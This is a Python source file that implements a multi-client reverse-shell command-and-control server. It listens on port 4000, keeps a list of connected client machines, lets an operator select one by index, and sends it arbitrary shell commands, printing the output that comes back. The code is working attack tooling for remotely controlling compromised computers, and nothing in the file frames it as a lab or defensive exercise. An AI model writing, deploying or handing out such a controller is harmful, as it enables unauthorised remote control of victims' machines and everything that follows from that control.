import socket
import threading
from queue import Queue

NUMBER_OF_THREADS = 2
JOB_NUMBER = [1, 2]
queue = Queue()
all_connections = []
all_addresses = []


def socket_create():
    try:
        global host
        global port
        global s
        host = ''
        port = 4000
        s = socket.socket()
    except socket.error as msg:
        print(str(msg))

def socket_bind():
    try:
        global host
        global port
        global s
        s.bind((host, port))
        s.listen(5)
    except socket.error as msg:
        print("socket binding error: " + str(msg) + '\n' + 'Retrying')
        socket_bind()


def accept_connections():
    for c in all_connections:
        c.close()
    
    del all_connections[:]
    del all_addresses[:]

    while True:
        try:
            conn, addr = s.accept()
            conn.setblocking(1) # no timeout
            all_connections.append(conn)
            all_addresses.append(addr)
            print("\nConnection has been established: " + addr[0])
        except:
            print("Error accepting connections")

# Interactive prompt for sending commands remotely

def start_system():
    while True:
        cmd = input('system> ')
        if cmd == 'list':
            list_connections()
        elif 'select' in cmd:
            conn = get_target(cmd)
            if conn is not None:
                send_commands(conn)
        else:
            print("Command not recognized")


# display all current connections
def list_connections():
    results = ''
    for i, conn in enumerate(all_connections):
        try:
            conn.send(str.encode(' '))
            conn.recv(20480)
        except:
            del all_connections[i]
            del all_addresses[i]
            continue

        results += str(i) + '   ' + str(all_addresses[i][0]) + '   ' + str(all_addresses[i][1]) + '\n'
    print('------ Clients -------' + '\n' + results)


def get_target(cmd):
    try:
        target = cmd.replace('select ', '')
        target = int(target)
        conn = all_connections[target]
        print("You are now connected to " + str(all_addresses[target][0]))
        print(str(all_addresses[target][0]) + '> ', end='')
        return conn
    except:
        print("Not a valid selection")
        return None



def send_commands(conn):
    while True:
        try:   
            cmd = input()
            if len(str.encode(cmd)) > 0:
                conn.send(str.encode(cmd))
                client_res = str(conn.recv(20480), 'utf-8')
                print(client_res, end="")

            if cmd == 'quit':
                break
        except:
            print("Connection was lost")
            break
            
# Create worker threads

def create_workers():
    for _ in range(NUMBER_OF_THREADS):
        t = threading.Thread(target=work)
        t.daemon = True
        t.start()

# Do the next job in the queue (handle connections, sending commands)
def work():
    while True:
        x = queue.get()
        if x == 1:
            socket_create()
            socket_bind()
            accept_connections()
        if x == 2:
            start_system()
        queue.task_done()


# Each list item is a new job
def create_jobs():
    for x in JOB_NUMBER:
        queue.put(x)
    queue.join()


create_workers()
create_jobs()


